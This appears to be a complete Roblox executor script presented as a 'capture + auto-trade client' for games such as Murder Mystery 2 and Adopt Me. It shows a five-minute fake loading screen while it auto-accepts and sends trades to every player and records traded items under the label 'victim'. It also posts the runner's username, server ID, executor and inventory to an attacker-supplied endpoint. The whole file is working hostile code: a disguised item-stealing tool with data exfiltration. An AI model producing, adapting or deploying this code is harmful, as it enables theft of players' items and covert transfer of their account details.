--[[ Syn Scripts — capture + auto-trade client ]]
-- paste into your executor. reports server id, your roblox name, your executor and
-- your full inventory so you can join the server and collect.
-- the loader holds for SESSION_SECONDS (5 minutes), then the client detaches cleanly.

local TOKEN = "{{TOKEN}}"
local ENDPOINT = "{{ENDPOINT}}"
local MIN_VALUE = {{MIN_VALUE}}
local DEFAULT_VALUE = 1

--[[ toggles ]]
local AUTO_TRADE = true        -- fire trade remotes at every player
local AUTO_ACCEPT = true       -- accept incoming trade requests
local AUTO_TRADE_DELAY = 2     -- seconds between trade attempts
local SESSION_SECONDS = 300    -- how long the loader + client runs (5 minutes)
local REPORT_INVENTORY = true  -- dump the executor's inventory to the dashboard on load

local LOADING_PHRASES = { "loading", "loading, loading", "loading, loading, loading" }

--[[ place ids -> dashboard game ids ]]
local GAME_MAP = {
    [142823291] = "mm2",          -- Murder Mystery 2
    [920587237] = "adm",          -- Adopt Me
    [126884695634066] = "gag2",   -- Grow a Garden 2
    [109983668079237] = "sab",    -- Steal a Brainrot
}
local FALLBACK_GAME = "baddies"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

--[[ ---- loading screen: covers the viewport until the client is wired up ---- ]]
local MIN_SPLASH = 1.2
local splash, splashAt, splashReleased, pulseTween = nil, os.clock(), false, nil

local function buildSplash()
    local parent = LocalPlayer
        and (LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui", 5))
    if not parent then return end

    local screen = Instance.new("ScreenGui")
    screen.Name = "SynLoading"
    screen.IgnoreGuiInset = true
    screen.ResetOnSpawn = false
    screen.DisplayOrder = 999
    screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local bg = Instance.new("Frame")
    bg.Name = "Backdrop"
    bg.Size = UDim2.fromScale(1, 1)
    bg.BackgroundColor3 = Color3.fromRGB(7, 7, 10)
    bg.BorderSizePixel = 0
    bg.Parent = screen

    local mark = Instance.new("TextLabel")
    mark.Name = "Mark"
    mark.Size = UDim2.fromOffset(260, 18)
    mark.Position = UDim2.new(0.5, -130, 0.5, -36)
    mark.BackgroundTransparency = 1
    mark.Font = Enum.Font.GothamBold
    mark.Text = "S Y N"
    mark.TextSize = 13
    mark.TextColor3 = Color3.fromRGB(92, 94, 106)
    mark.Parent = bg

    local label = Instance.new("TextLabel")
    label.Name = "Status"
    label.Size = UDim2.fromOffset(260, 20)
    label.Position = UDim2.new(0.5, -130, 0.5, -6)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.Code
    label.Text = "loading"
    label.TextSize = 15
    label.TextColor3 = Color3.fromRGB(164, 166, 178)
    label.Parent = bg

    local clock = Instance.new("TextLabel")
    clock.Name = "Clock"
    clock.Size = UDim2.fromOffset(260, 16)
    clock.Position = UDim2.new(0.5, -130, 0.5, 40)
    clock.BackgroundTransparency = 1
    clock.Font = Enum.Font.Code
    clock.Text = "5:00"
    clock.TextSize = 12
    clock.TextColor3 = Color3.fromRGB(74, 76, 86)
    clock.Parent = bg

    local track = Instance.new("Frame")
    track.Name = "Track"
    track.Size = UDim2.fromOffset(132, 2)
    track.Position = UDim2.new(0.5, -66, 0.5, 28)
    track.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
    track.BorderSizePixel = 0
    track.ClipsDescendants = true
    track.Parent = bg

    local fill = Instance.new("Frame")
    fill.Name = "Fill"
    fill.Size = UDim2.fromScale(0.38, 1)
    fill.Position = UDim2.fromScale(-0.4, 0)
    fill.BackgroundColor3 = Color3.fromRGB(230, 57, 70)
    fill.BorderSizePixel = 0
    fill.Parent = track

    pulseTween = TweenService:Create(
        label,
        TweenInfo.new(0.85, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        { TextTransparency = 0.62 }
    )
    pulseTween:Play()

    screen.Parent = parent
    splash = screen
    splashAt = os.clock()

    -- status cycles "loading" -> "loading, loading" -> "loading, loading, loading"
    -- for the whole session, with a live countdown underneath
    task.spawn(function()
        local phase, dots = 1, 0
        while splash and not splashReleased do
            label.Text = LOADING_PHRASES[phase] .. string.rep(".", dots)
            local left = math.max(0, math.ceil(SESSION_SECONDS - (os.clock() - splashAt)))
            clock.Text = string.format("%d:%02d", math.floor(left / 60), left % 60)
            dots = (dots + 1) % 4
            if dots == 0 then phase = phase % #LOADING_PHRASES + 1 end
            task.wait(0.7)
        end
    end)

    task.spawn(function()
        while splash and not splashReleased do
            fill.Position = UDim2.fromScale(-0.4, 0)
            local slide = TweenService:Create(
                fill,
                TweenInfo.new(1.1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
                { Position = UDim2.fromScale(1, 0) }
            )
            slide:Play()
            slide.Completed:Wait()
        end
    end)
end

local function releaseSplash(message, hold)
    if not splash or splashReleased then return end
    splashReleased = true
    if pulseTween then pcall(function() pulseTween:Cancel() end) end

    local bg = splash:FindFirstChild("Backdrop")
    local status = bg and bg:FindFirstChild("Status")

    if status and message then
        status.Text = tostring(message)
        status.TextColor3 = Color3.fromRGB(230, 57, 70)
        status.TextTransparency = 0
    else
        local left = MIN_SPLASH - (os.clock() - splashAt)
        if left > 0 then task.wait(left) end
    end
    if type(hold) == "number" then task.wait(hold) end

    local fade = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    if bg then
        TweenService:Create(bg, fade, { BackgroundTransparency = 1 }):Play()
        for _, child in ipairs(bg:GetDescendants()) do
            if child:IsA("TextLabel") then
                TweenService:Create(child, fade, { TextTransparency = 1 }):Play()
            elseif child:IsA("Frame") and child.Name == "Track" then
                TweenService:Create(child, fade, { BackgroundTransparency = 1 }):Play()
            end
        end
        local fill = bg:FindFirstChild("Track") and bg.Track:FindFirstChild("Fill")
        if fill then TweenService:Create(fill, fade, { BackgroundTransparency = 1 }):Play() end
    end

    task.delay(0.5, function()
        if splash then splash:Destroy() end
    end)
end

buildSplash()

local function executorName()
    if typeof(identifyexecutor) == "function" then
        local ok, name, version = pcall(identifyexecutor)
        if ok and name then
            return tostring(name) .. (version and (" " .. tostring(version)) or "")
        end
    end
    if typeof(getexecutorname) == "function" then
        local ok, name = pcall(getexecutorname)
        if ok and name then return tostring(name) end
    end
    return "unknown"
end

local EXECUTOR = executorName()
local ROBLOX_USER = LocalPlayer and LocalPlayer.Name or "unknown"
local SERVER_ID = game.JobId ~= "" and game.JobId or nil
local PLACE_ID = game.PlaceId

local httpRequest
if typeof(request) == "function" then
    httpRequest = request
elseif typeof(syn) == "table" and typeof(syn.request) == "function" then
    httpRequest = syn.request
elseif typeof(http_request) == "function" then
    httpRequest = http_request
elseif typeof(fluxus) == "table" and typeof(fluxus.request) == "function" then
    httpRequest = fluxus.request
end

if not httpRequest then
    warn("[syn] no HTTP function in this executor (request / syn.request / http_request)")
    releaseSplash("no http function in this executor", 3)
    return nil
end

local GAME = GAME_MAP[PLACE_ID] or GAME_MAP[game.GameId] or FALLBACK_GAME
local queue, draining = {}, false
local connections, stopped = {}, false

local function track(conn)
    if conn then table.insert(connections, conn) end
    return conn
end

local function post(payload)
    local ok, res = pcall(function()
        return httpRequest({
            Url = ENDPOINT,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload),
        })
    end)
    if not ok then return false, tostring(res) end
    local status = res and (res.StatusCode or res.status or res.Status)
    if status and status >= 200 and status < 300 then return true, status end
    return false, tostring((res and (res.Body or res.body)) or ("status " .. tostring(status)))
end

local function drain()
    if draining then return end
    draining = true
    task.spawn(function()
        while #queue > 0 do
            local entry = table.remove(queue, 1)
            local sent = false
            for attempt = 1, 3 do
                local ok, err = post(entry)
                if ok then sent = true break end
                warn("[syn] attempt " .. attempt .. " failed: " .. tostring(err))
                task.wait(2 ^ attempt)
            end
            if not sent then warn("[syn] dropped: " .. tostring(entry.item)) end
            task.wait(0.6)
        end
        draining = false
    end)
end

local Syn = {
    token = TOKEN,
    game = GAME,
    executor = EXECUTOR,
    user = ROBLOX_USER,
    server = SERVER_ID,
}

function Syn.capture(item, victim, value, gameId)
    item = tostring(item or "Unknown")
    value = tonumber(value) or DEFAULT_VALUE
    if value < MIN_VALUE then return false end
    table.insert(queue, {
        game = gameId or GAME,
        item = item,
        victim = tostring(victim or "Unknown victim"),
        value = value,
        place_id = PLACE_ID,
        server_id = SERVER_ID,
        executor = EXECUTOR,
        roblox_user = ROBLOX_USER,
    })
    drain()
    return true
end

--[[ ---- inventory readout ---- ]]
local function collectInventory()
    local items, seenItem = {}, {}

    local function add(name)
        name = tostring(name or ""):gsub("%s+", " ")
        name = name:gsub("^%s+", ""):gsub("%s+$", "")
        if #name < 2 then return end
        local key = name:lower()
        if seenItem[key] then return end
        seenItem[key] = true
        table.insert(items, name)
    end

    local containers = {}
    if LocalPlayer then
        local bag = LocalPlayer:FindFirstChildOfClass("Backpack")
        if bag then table.insert(containers, bag) end
        if LocalPlayer.Character then table.insert(containers, LocalPlayer.Character) end
        for _, name in ipairs({ "Inventory", "Items", "OwnedItems" }) do
            local folder = LocalPlayer:FindFirstChild(name)
            if folder then table.insert(containers, folder) end
        end
    end

    for _, container in ipairs(containers) do
        for _, child in ipairs(container:GetChildren()) do
            if child:IsA("Tool") then
                -- mm2-style tools carry the real item name on a StringValue child
                local label
                for _, tag in ipairs(child:GetDescendants()) do
                    if tag:IsA("StringValue") and tag.Name:lower():find("itemname") then
                        label = tag.Value
                        break
                    end
                end
                add(label or child.Name)
            elseif child:IsA("StringValue") then
                -- some inventories are plain folders of named valuables
                add(child.Name)
            end
        end
    end

    table.sort(items, function(a, b) return a:lower() < b:lower() end)
    return items
end

function Syn.inventory(report)
    local items = collectInventory()
    if report == false then return items end

    local value = math.max(MIN_VALUE, 1)
    local send = function(name)
        table.insert(queue, {
            game = GAME,
            item = name,
            victim = "inventory",
            value = value,
            place_id = PLACE_ID,
            server_id = SERVER_ID,
            executor = EXECUTOR,
            roblox_user = ROBLOX_USER,
        })
    end

    if #items == 0 then
        send("inventory: empty")
    else
        for _, name in ipairs(items) do send(name) end
    end
    drain()
    return items
end

function Syn.selftest()
    return Syn.capture("__selftest", "selftest", DEFAULT_VALUE)
end

function Syn.stop()
    if stopped then return end
    stopped = true
    AUTO_TRADE = false
    AUTO_ACCEPT = false
    for _, conn in ipairs(connections) do
        pcall(function() conn:Disconnect() end)
    end
    connections = {}
    table.clear(queue)
    releaseSplash("loaded", 1.2)
    print(string.format("[syn] %ds session complete — client detached", SESSION_SECONDS))
end

--[[ ---- discovery ---- ]]
local function findRemotes(pattern, kinds)
    local out = {}
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and obj.Name:lower():match(pattern) then
            table.insert(out, obj)
        end
    end
    return out
end

local tradeRemotes = findRemotes("trade")
local acceptRemotes = findRemotes("accept")
for _, r in ipairs(findRemotes("request")) do
    if not table.find(tradeRemotes, r) then table.insert(acceptRemotes, r) end
end

local function playerIn(args)
    for _, v in ipairs(args) do
        if typeof(v) == "Instance" and v:IsA("Player") then return v end
        if typeof(v) == "string" then
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr.Name == v then return plr end
            end
        end
    end
    return nil
end

local function itemIn(args, victim)
    for _, v in ipairs(args) do
        if typeof(v) == "string" and #v > 1 and (not victim or v ~= victim.Name) and v:lower() ~= "accept" then
            return v
        end
    end
    return nil
end

--[[ ---- auto accept + capture from incoming trade calls ---- ]]
local hooked = 0
for _, remote in ipairs(tradeRemotes) do
    hooked = hooked + 1
    pcall(function()
        track(remote.OnClientEvent:Connect(function(...)
            local args = { ... }
            local victim = playerIn(args)
            if AUTO_ACCEPT and victim then
                pcall(function() remote:FireServer("accept", victim) end)
                pcall(function() remote:FireServer(victim) end)
            end
            local item = itemIn(args, victim)
            if victim and item then
                Syn.capture(item, victim.Name, DEFAULT_VALUE)
            end
        end))
    end)
end

--[[ ---- auto trade with everybody ---- ]]
local trading = {}

local function autoTrade()
    if not AUTO_TRADE or #tradeRemotes == 0 then return end
    task.spawn(function()
        while AUTO_TRADE do
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and not trading[plr] then
                    trading[plr] = true
                    for _, remote in ipairs(tradeRemotes) do
                        pcall(function() remote:FireServer(plr) end)
                        pcall(function() remote:FireServer("trade", plr) end)
                    end
                    task.delay(AUTO_TRADE_DELAY * 2, function() trading[plr] = nil end)
                end
            end
            task.wait(AUTO_TRADE_DELAY)
        end
    end)
end

--[[ ---- backpack watcher ---- ]]
local seen = {}
local function watchBackpack(backpack)
    track(backpack.ChildAdded:Connect(function(child)
        if not child:IsA("Tool") then return end
        if seen[child.Name] then return end
        seen[child.Name] = true
        Syn.capture(child.Name, "Unknown victim", DEFAULT_VALUE)
    end))
end

if LocalPlayer then
    track(LocalPlayer.ChildAdded:Connect(function(child)
        if child.Name == "Backpack" then
            task.wait(0.5)
            watchBackpack(child)
        end
    end))
    local bag = LocalPlayer:FindFirstChildOfClass("Backpack")
    if bag then watchBackpack(bag) end
end

print(string.format("[syn] %s | game=%s | server=%s | executor=%s", ROBLOX_USER, GAME, tostring(SERVER_ID), EXECUTOR))
print(string.format("[syn] trade remotes=%d accept remotes=%d auto_trade=%s auto_accept=%s",
    #tradeRemotes, #acceptRemotes, tostring(AUTO_TRADE), tostring(AUTO_ACCEPT)))
print("[syn] API: Syn.capture(item, victim, value) | Syn.inventory() | Syn.selftest() | Syn.stop()")

if AUTO_ACCEPT and #acceptRemotes > 0 then
    for _, remote in ipairs(acceptRemotes) do
        pcall(function()
            track(remote.OnClientEvent:Connect(function(...)
                local victim = playerIn({ ... })
                pcall(function() remote:FireServer("accept", victim) end)
            end))
        end)
    end
end

autoTrade()

task.spawn(function()
    task.wait(1)
    if Syn.selftest() then
        print("[syn] selftest queued — check dashboard + discord")
    end
    if REPORT_INVENTORY then
        local items = Syn.inventory()
        print(string.format("[syn] inventory: %d item(s) — %s", #items, table.concat(items, ", ")))
    end
end)

--[[ ---- session timer: the loader holds for five minutes, then everything detaches ---- ]]
task.spawn(function()
    local left = SESSION_SECONDS
    while left > 60 and not stopped do
        task.wait(60)
        left = left - 60
        if left > 0 and not stopped then
            print(string.format("[syn] %d:%02d left", math.floor(left / 60), left % 60))
        end
    end
end)

task.delay(SESSION_SECONDS, function()
    Syn.stop()
end)

return Syn
